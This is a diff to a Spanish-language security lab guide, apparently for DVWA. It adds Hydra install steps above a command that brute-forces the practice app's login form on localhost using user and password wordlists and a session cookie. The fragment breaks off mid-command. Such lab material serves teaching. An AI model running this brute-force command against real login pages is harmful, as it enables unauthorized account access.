@@ -123,6 +123,14 @@ Diferencias clave entre respuestas:
 
 ### 4. Ataque de fuerza bruta con Hydra
 
+Instalación en Linux:
+
+```bash
+sudo apt install hydra
+```
+
+Ejecución:
+
 ```bash
 hydra -L usuarios.txt -P passwords.txt localhost http-get-form \
 "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:security=low;PHPSESSID=<ID>:F=Username and/or password incorrect" \
